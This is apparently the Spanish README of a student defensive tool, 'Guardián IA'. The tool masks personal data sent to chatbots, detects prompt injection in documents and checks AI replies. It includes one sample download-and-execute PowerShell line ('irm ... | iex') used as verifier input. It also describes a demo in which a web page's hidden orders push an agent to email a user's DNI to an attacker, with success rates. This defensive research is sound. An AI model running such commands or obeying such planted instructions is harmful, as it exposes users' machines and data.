# 🛡️ Guardián IA

Programa que se pone **entre tú y la IA** para que puedas usarla sin regalarle tus datos, sin que un documento la manipule y sin que su respuesta te meta en un lío. Funciona en la terminal, en una web local, delante de cualquier agente o programa (modo proxy) y **dentro de ChatGPT, Claude, Gemini y otros chatbots** con su extensión del navegador. Lo que ve tus datos funciona entero en tu ordenador con un modelo local (Ollama).

Pensado también para quien no sabe de informática: se abre con un doble clic en el escritorio, **te ayuda a preguntar mejor** a la IA (dos versiones de tu pregunta para elegir), te dice **si un SMS, un WhatsApp o un correo es una estafa** (y qué hacer si ya has picado) y tiene un juego para aprender a verlas.

Proyecto de la asignatura *Proyectos de Ciberseguridad - Ciberejercicios*. Autor: Antonio De Mateo Bodegas. Licencia MIT.

```
 Tú ──► [ADUANA] ──► [ESCUDO] ──► IA (solo ve [PERSONA_1], [DNI_1]...) ──► [VERIFICADOR] ──► [ESCUDO] ──► Tú
        ¿órdenes      tapa DNI, IBAN,                                       ¿comandos         vuelve a poner
        escondidas?   nombres, claves...                                    peligrosos?       tus datos
                                                                            ¿enlaces falsos?
        [REVISOR DEL PC]: extensiones, conectores MCP, modelos descargados y Ollama

 Dónde se usa: terminal · web local (guardian web) · proxy para agentes · extensión en ChatGPT, Claude, Gemini...
 Qué ha hecho: guardian informe / pestaña Actividad (cuántos datos ha tapado y qué ha parado, sin guardar ninguno)
```

## Qué hace

| Módulo | Qué hace |
| --- | --- |
| **1. Escudo de datos** | Detecta 15 tipos de dato con reglas validadas (letra del DNI y NIE, Luhn en tarjetas, control del IBAN, del CIF y del número de la Seguridad Social...) y, con la IA local, nombres, direcciones y contraseñas escritas a mano. Los cambia por marcadores (`[DNI_1]`) y los devuelve en la respuesta. |
| **2. Verificador de respuestas** | Revisa lo que contesta la IA: comandos que descargan y ejecutan programas (ClickFix), datos metidos en enlaces o imágenes para sacarlos fuera, webs que imitan a tu banco, enlaces acortados, peticiones de contraseñas, si ha contado sus instrucciones internas (código canario), si lo que dice sale del documento o se lo inventa y el **eco de la trampa**: cuando la IA ya no puede actuar pero te pide a ti que hagas lo que ordenaba la trampa ("verifica tu cuenta en..."). |
| **3. Aduana de documentos** | Busca prompt injection en textos, HTML, **Word, PowerPoint, Excel y PDF**: frases de ataque en español e inglés, caracteres invisibles, mensajes escritos con letras invisibles ("ASCII smuggling", que traduce para que veas qué dicen), órdenes en base64 y **texto que tú no ves pero la IA sí** (letra blanca, diminuta, oculta, fuera de la página o de la diapositiva, hojas y celdas ocultas, formato `;;;`). Bloquea lo peligroso y a la IA solo le pasa lo que tú ves. También avisa de macros, plantillas remotas tipo Follina, PDF con JavaScript y fórmulas de Excel que ejecutan programas (DDE). |
| **4. Revisor de la IA del PC** | Nota de salud de 0 a 100: extensiones del navegador maliciosas o con demasiados permisos, conectores MCP (Claude Desktop, Cursor, VS Code...) con secretos en claro o acceso a todo el disco, modelos descargados con código escondido (pickle, Keras, plantillas GGUF envenenadas) y Ollama abierto a la red. Solo mira: no cambia nada. |
| **Modo proxy** | El Guardián delante de **cualquier programa** que hable con la IA en formato OpenAI (agentes, Open WebUI, extensiones...). Además vigila las **acciones de los agentes**: bloquea las que llevan comandos peligrosos, sacan datos en un enlace, llegan justo después de leer algo sospechoso o mandan algo a un destino que no has escrito tú. |
| **Extensión del navegador** | En ChatGPT, Claude, Gemini, Copilot, DeepSeek, Mistral, Perplexity, Qwen y Grok: tapa tus datos al pegar y antes de enviar, pasa la aduana a lo que pegas y revisa la respuesta. En su panel lateral ves la respuesta con tus datos reales; la web del chatbot nunca los ve. Habla con el Guardián de tu PC (`guardian servicio`). |
| **✨ Mejorar mi pregunta** | Te dice qué le falta a lo que le vas a preguntar a una IA (qué quieres, de qué trata, para qué, cómo quieres la respuesta), le pone nota y te da dos versiones para elegir: **Directa** y **Completa**. Tus datos se tapan antes de nada y deja huecos «escribe aquí...» en vez de inventarse lo que falta. En la terminal, en la web y en la extensión (botón «✨ Mejorar» encima del chat o `Alt+M`). |
| **🚨 ¿Es una estafa?** | Pega un SMS, un WhatsApp o un correo, o dale un correo guardado (`.eml`) o una **bandeja entera**: te dice si tiene las pistas de una estafa, cuál parece (paquetería, tu banco, Hacienda, fraude del CEO, sextorsión, falso empleo...), te explica cada pista para que aprendas a verlas y te dice qué hacer, con primeros auxilios si ya has picado. En un correo entero mira también quién lo manda de verdad, adónde llevan los enlaces, el texto escondido para engañar a la IA que te lo resume y los adjuntos disfrazados (`factura.pdf.iso`). |
| **🎓 ¿Lo detectas?** | Juego con 13 mensajes copiados de los engaños que más circulan en España (y 4 legítimos, para no desconfiar de todo): decides y te explica las pistas. |
| **Panel de actividad** | `guardian informe`, la pestaña 📈 Actividad de la web y «Esta semana» en la extensión: cuántos datos ha tapado y de qué tipo, qué trampas y respuestas peligrosas ha parado y qué acciones de agentes ha bloqueado. El registro solo guarda cuántos y de qué tipo, nunca el dato. |

Regla de oro: las piezas que ven tus datos sin tapar (el detector y los jueces) **solo pueden usar una IA local**; el código se niega a usar una remota. La IA que responde puede estar en la nube (Ollama Cloud u otra API), pero entonces solo recibe marcadores.

## Instalación (Windows)

Requisitos: Python 3.11 o superior y, para el chat y la detección con IA, [Ollama](https://ollama.com) con un modelo (`qwen3.5:9b`; en un PC sin tarjeta gráfica potente, `qwen3.5:4b` o `qwen3.5:2b`).

Con un solo comando, dentro de la carpeta `guardian_ia`:

```powershell
powershell -ExecutionPolicy Bypass -File .\instalar.ps1
```

Busca Python, crea el entorno virtual (si la carpeta tiene una ruta larga, lo pone en `%LOCALAPPDATA%\GuardianIA\entorno` para que Windows no corte archivos), instala todo, comprueba Ollama y el modelo (`-DescargarModelo` lo descarga) y crea el lanzador `guardian.cmd`. Desde entonces, sin activar nada: `.\guardian demo`, `.\guardian web`, `.\guardian servicio`... Se puede repetir cuando quieras: reutiliza lo que ya está.

A mano (o en Linux y macOS):

```powershell
cd guardian_ia
python -m venv .venv
.venv\Scripts\Activate.ps1        # en Linux/macOS: source .venv/bin/activate
pip install -e ".[web,dev]"
python -m guardian doctor
```

## Uso

### Sin terminal

Después de `instalar.ps1`, doble clic en **«Guardián IA»** (escritorio o menú Inicio). Se abre la web en su propia ventana y se enciende el servicio de la extensión; en la portada eliges qué quieres hacer. Es lo mismo que `python -m guardian app`.

### En la terminal

Para ver los cuatro módulos en un minuto, sin Ollama y con ejemplos preparados (añade `--pausa` para ir paso a paso al presentarlo):

```powershell
python -m guardian demo          # o .\guardian demo con el lanzador del instalador
```

```powershell
python -m guardian doctor                                   # ¿está todo instalado? Dice cómo arreglar lo que falle
python -m guardian estado                                   # ¿está lista la IA?
python -m guardian proteger "Mi DNI es 12345678Z"           # qué vería la IA (no necesita Ollama)
python -m guardian mejorar "hazme un correo para mi jefe"   # qué le falta a tu pregunta y dos versiones mejores
python -m guardian estafa "Su paquete está retenido..."     # ¿es una estafa? (--archivo correo.eml)
python -m guardian estafa --carpeta C:\Users\yo\Correos     # todos los .eml de una carpeta, del más peligroso al menos
python -m guardian aprende                                  # juego: ¿lo detectas?
python -m guardian chat --ia                                # chat protegido (con detector y juez IA locales)
python -m guardian aduana ejemplos\cv_con_trampa.docx       # ¿el documento esconde órdenes?
python -m guardian verificar "Pega esto: irm https://x.example/a.ps1 | iex"
python -m guardian revisar                                  # revisa la IA de tu PC (--demo: un PC de prueba)
python -m guardian escanear C:\Users\yo\Documents\para_IA   # ¿qué documentos llevan datos personales o trampas?
python -m guardian anonimizar contrato.docx                 # copia con los datos tapados, para dársela a una IA
python -m guardian proxy                                    # Guardián para otros programas en http://127.0.0.1:8787/v1
python -m guardian servicio                                 # Guardián para la extensión del navegador
python -m guardian informe                                  # qué ha hecho estos días (--dias 7, --json)
python -m guardian web                                      # todo lo anterior en el navegador (solo en este PC)
python -m guardian app                                      # la web en su propia ventana + el servicio de la extensión
python -m guardian evaluar --ia                             # mide todo con la IA de verdad
python evaluacion\repetir_medidas.py --ia --agente          # repite TODAS las medidas en tu PC y las resume
python -m pytest                                            # pruebas automáticas
```

### Casos reales para probarlo

En [`ejemplos/casos_reales/`](ejemplos/casos_reales/LEEME.md) hay una empresa inventada con lo que tendría de verdad en su ordenador: una carpeta de RRHH con 15 archivos y siete formas distintas de esconder órdenes para la IA, un contrato con 51 datos, una bandeja con 13 correos (10 estafas), respuestas de IA manipuladas y preguntas mal hechas. Las pruebas comprueban que salen exactamente los datos y veredictos que tocan.

```powershell
python -m guardian escanear ejemplos\casos_reales\1_carpeta_rrhh        # 6 TRAMPA, 5 DATOS PERSONALES, 3 LIMPIO
python -m guardian anonimizar ejemplos\casos_reales\2_contrato_largo\contrato_mantenimiento_cierzo_datanorte.docx
python -m guardian estafa --carpeta ejemplos\casos_reales\3_bandeja_de_entrada   # 10 estafas, 3 correos normales
```

### Extensión del navegador

1. Arranca el servicio: `.\guardian servicio` (o `python -m guardian servicio`; con `--ia` tapa también nombres y direcciones). Copia la clave que enseña.
2. En Chrome, Edge o Brave abre `chrome://extensions`, activa el **modo de desarrollador**, pulsa **Cargar descomprimida** y elige la carpeta `guardian_ia/extension`.
3. En las opciones que se abren, pega la clave y pulsa **Guardar y probar**: debe salir «Conectado».

Para probarla sin cuenta ni Internet: icono de la extensión → **Página de prueba** (un chat de mentira con cinco ejemplos). Encima del cuadro del chat sale el botón **«✨ Mejorar»** (o `Alt+M`), y con clic derecho sobre cualquier texto seleccionado (un correo en Gmail, un WhatsApp Web...) → **«Guardián: ¿es una estafa?»**. Cómo funciona y por qué es segura: [`extension/LEEME.md`](extension/LEEME.md).

Dentro del chat: `/doc RUTA` adjunta un documento (texto, Word o PDF) a la siguiente pregunta, `/ver` enseña u oculta lo que ve la IA, `/nueva` vacía la bóveda de datos y `/salir` cierra.

### IA en la nube o en otro programa

| Proveedor | Cómo | Notas |
| --- | --- | --- |
| Ollama en tu PC | (por defecto) | Nada sale del ordenador |
| Ollama Cloud | `--proveedor ollama-cloud --modelo gpt-oss:120b` y la clave en `OLLAMA_API_KEY` | Modelos grandes; solo reciben datos tapados |
| Cualquier API tipo OpenAI | `--proveedor openai --url http://127.0.0.1:1234/v1 --modelo ...` y la clave (si hace falta) en `GUARDIAN_API_KEY` | LM Studio, llama.cpp, vLLM, OpenAI, OpenRouter... |

### Modo proxy y agentes

```powershell
python -m guardian proxy --clave mi-clave-larga --sin-pensar   # terminal 1 (con --ia, el juez revisa también lo que lee el agente)
python ejemplos\agente_demo.py --directo                        # terminal 2: agente SIN Guardián
python ejemplos\agente_demo.py --clave mi-clave-larga           # agente CON Guardián
python ejemplos\agente_demo.py --clave mi-clave-larga --veces 10 --temperatura 0.7   # repetir el ataque y contar
```

`agente_demo.py` es un agente con dos herramientas de mentira (leer una web y mandar un correo). La web tiene órdenes escondidas para que mande tu nombre, correo y DNI a un atacante (`--trampa suave` usa otra orden, con frases de ataque de las de siempre, y `--trampa ninguna` es la web sin trampa). En cualquier programa compatible, pon como dirección de la IA `http://127.0.0.1:8787/v1` y como clave la del proxy.

En la ventana del proxy sale una línea por petición con lo que ha hecho el Guardián, sin enseñar ningún dato:

```text
[proxy] POST /v1/chat/completions -> 200 · datos tapados: 1 EMAIL, 1 DNI · 1 resultado de herramienta revisado · acción bloqueada: enviar_correo · la IA ha contestado sin ella · 7.4 s
```

Con `--leer-sospechosos`, una web o un archivo con riesgo ALTO no se bloquea entero: la IA lo lee sin las partes ocultas para poder contestarte, pero no puede hacer ninguna acción (y al final de la respuesta te avisa de que lo que ha leído traía órdenes ocultas). Con `--confirmar`, el proxy te pregunta antes de dejar pasar una acción dudosa en vez de bloquearla (`--confirmar enviar_correo` pregunta siempre por esa herramienta). Si el Guardián bloquea una acción, le cuenta a la IA por qué y le pide que conteste sin ella, para que el ataque no te deje sin respuesta (`--parar-tras-bloqueo` lo desactiva). `--marcar-datos delimitar` (o `marcas`) señala a la IA lo que viene de las herramientas para que no lo tome por órdenes ("spotlighting").

`--sin-pensar` pide al modelo que no "piense" en voz alta (`reasoning_effort: none`), que con Qwen3.5 es varias veces más rápido. Para el proveedor `openai` se pueden añadir opciones así a cada petición con una variable: `$env:GUARDIAN_OPENAI_EXTRA='{"reasoning_effort":"none"}'`.

## Resultados

Se mide con un conjunto de **desarrollo** (usado para ajustar), una **prueba ciega** (escrita a mano con otras frases, no se usó para ajustar nada) y dos **conjuntos públicos** de otros investigadores. Todos los detalles y el método están en [`docs/evaluacion.md`](docs/evaluacion.md).

| | Solo reglas | Reglas + Qwen3.5 2B | Reglas + Qwen3.5 9B |
| --- | --- | --- | --- |
| Escudo, prueba ciega: datos que se escapan (fuga) | 35 %¹ | 2,7 % | **0 %** |
| Aduana, prueba ciega: ataques detectados / falsas alarmas | 30 % / 0 % | 50 % / 0 % | **100 % / 0 %** |
| Aduana, BIPIA (Microsoft): ataques detectados / falsas alarmas | 54 % / 0 % | 54 % / 0 % | **76 % / 2 %** |
| Nombres de personas, CoNLL-2002: recall | 0 % | 57 % | **94 %** |

¹ 37,8 % en la 0.3.0: el arreglo de los IBAN en minúsculas la baja al 35,1 %, pero ese fallo salió de la propia prueba ciega, así que la mejora ya no cuenta como medida a ciegas. Las columnas con IA son de la 0.3.0 (Qwen3.5 en CPU); `evaluacion/repetir_medidas.py --ia` las repite en otro PC.

**Ataque a un agente con herramientas** (10 intentos, una web con una orden escondida para que el agente mande tu nombre, correo y DNI a un atacante):

| Agente | Sin Guardián: tus datos llegan al atacante | Con Guardián: llegan al atacante | Con Guardián: recibes las ofertas que pediste |
| --- | --- | --- | --- |
| Qwen3.5 2B, trampa directa | 5 de 10 | **0 de 10** | 10 de 10 |
| Qwen3.5 9B, trampa directa | 10 de 10 | **0 de 10** | 10 de 10 |
| Qwen3.5 9B, trampa suave | 10 de 10 | **0 de 10** | 10 de 10 (con `--leer-sospechosos`) |

El modelo grande obedece más a la trampa. Las reglas no reconocen la trampa directa, pero el control del flujo de datos la para igualmente, y como el proxy le pide a la IA que siga sin la acción bloqueada, recibes lo que pediste. En 160 intentos con trampa, ningún correo llegó al atacante. Sin trampa, el Guardián no estorba (10 de 10). Detalle, spotlighting y lo que todavía se escapa en [`docs/evaluacion.md`](docs/evaluacion.md#6-ataque-a-un-agente-con-herramientas).

**Eco de la trampa** (227 respuestas guardadas del ataque al agente, revisadas de nuevo sin llamar a ninguna IA con `evaluacion/medir_eco.py`): con la trampa suave y "leer sin poder actuar", la IA le repetía a Lucía lo que pedía la trampa; el verificador avisa en **8 de 8** respuestas con el 2B y **9 de 9** con el 9B, y en **0 de las 40** respuestas sin trampa.

Experimento de diseño del detector (32 textos): pedir **una lista por tipo de dato** en vez de una lista de objetos sube el F1 de 0,61 a 0,94 con Qwen3.5 2B y de 0,71 a 0,95 con Qwen3.5 9B.

## Documentación

| Documento | Contenido |
| --- | --- |
| [`docs/arquitectura.md`](docs/arquitectura.md) | Diagrama del flujo y de dónde interviene la IA, qué datos ve cada modelo, tecnologías y hardware |
| [`docs/amenazas.md`](docs/amenazas.md) | Análisis de riesgos: OWASP Top 10 para LLM 2025, prompt injection, fuga de información y control de acciones del propio Guardián |
| [`docs/estado_del_arte.md`](docs/estado_del_arte.md) | Herramientas parecidas (con y sin IA) e investigación en la que se basa |
| [`docs/evaluacion.md`](docs/evaluacion.md) | Método y todos los resultados |
| [`docs/casos_de_prueba.md`](docs/casos_de_prueba.md) | Casos de prueba automáticos y manuales |
| [`docs/uso_de_ia.md`](docs/uso_de_ia.md) | Cómo se ha usado la IA para desarrollar el proyecto |
| [`docs/planificacion.md`](docs/planificacion.md) | Hitos: el plan de 12 semanas frente a lo hecho, qué ha cambiado y por qué, y lo que queda |
| [`extension/LEEME.md`](extension/LEEME.md) | La extensión del navegador: instalación, cómo funciona y por qué es segura |
| [`CONTRIBUTING.md`](CONTRIBUTING.md) y [`SECURITY.md`](SECURITY.md) | Cómo contribuir y cómo avisar en privado de una forma de saltarse el Guardián |
| [`CHANGELOG.md`](CHANGELOG.md) | Historial de versiones |

## Estructura

```
guardian/
  escudo/       reglas validadas, detector IA, tapar y restaurar
  aduana/       reglas, lectores de Word, PowerPoint, Excel y PDF, juez IA
  verificador/  comandos, enlaces, eco de la trampa, respaldo en el documento
  revisor/      extensiones, conectores MCP, modelos, red
  ia.py         Ollama, Ollama Cloud y APIs tipo OpenAI
  nucleo.py     aduana → escudo → IA → verificador → restaurar → registro
  proxy.py      modo proxy: control de acciones y del flujo de datos, confirmación, spotlighting
  servicio.py   servicio local (127.0.0.1:8788, con clave) para la extensión del navegador
  actividad.py  resumen del registro: guardian informe, pestaña Actividad y panel de la extensión
  escaner.py    revisar carpetas y anonimizar documentos
  mejorador.py  «Mejorar mi pregunta»: qué le falta y dos versiones (reglas, o la IA local con --ia)
  estafas.py    «¿Es una estafa?»: pistas, tipo de estafa, qué hacer y primeros auxilios; bandejas enteras
  correo.py     leer correos .eml: remitente real, enlaces engañosos, texto escondido, adjuntos disfrazados
  escuela.py    el juego «¿Lo detectas?»
  tipos.py      nombres de los tipos de dato que entiende cualquiera («2 cuentas bancarias (IBAN)»)
  doctor.py     comprueba la instalación y dice cómo arreglarla
  demo.py       demostración de los cuatro módulos (python -m guardian demo)
extension/      extensión del navegador (Chrome, Edge, Brave) y sus pruebas
evaluacion/     conjuntos, experimentos, resultados y repetir_medidas.py
ejemplos/       documentos con trampa y limpios (texto, Word, PowerPoint, Excel, PDF), agente de demostración
  casos_reales/ la empresa inventada: carpeta de RRHH, contrato largo, bandeja de correos... (generar.py)
tests/          pruebas automáticas (IA falsa: no necesitan Ollama)
docs/           documentación
app_web.py      web en el navegador (guardian web; solo escucha en tu PC)
instalar.ps1    instalador para Windows
```

## Límites

- Las reglas cubren sobre todo formatos españoles y frases en español e inglés.
- No se analizan imágenes (texto dentro de una captura, un DNI escaneado): el escáner las cuenta como «sin revisar».
- Los `.msg` de Outlook no se leen todavía (hay que guardarlos como `.eml`).
- «¿Es una estafa?» y «Mejorar mi pregunta» sin IA funcionan con reglas: una estafa escrita de una forma nueva puede no tener las pistas que conocen, y por eso dicen «no veo señales claras de estafa», nunca «es seguro».
- La extensión depende de cómo está hecha la página de cada chatbot: si cambian su web, habrá que adaptarla. Lo que no puede leer no lo pega ni lo envía mientras parezca llevar datos y el servicio esté apagado.
- El detector y los jueces dependen del modelo: el 9B acierta más que el 2B pero tarda más.
- Ninguna defensa contra la prompt injection es perfecta: el Guardián usa varias capas para que un ataque tenga que saltarlas todas.
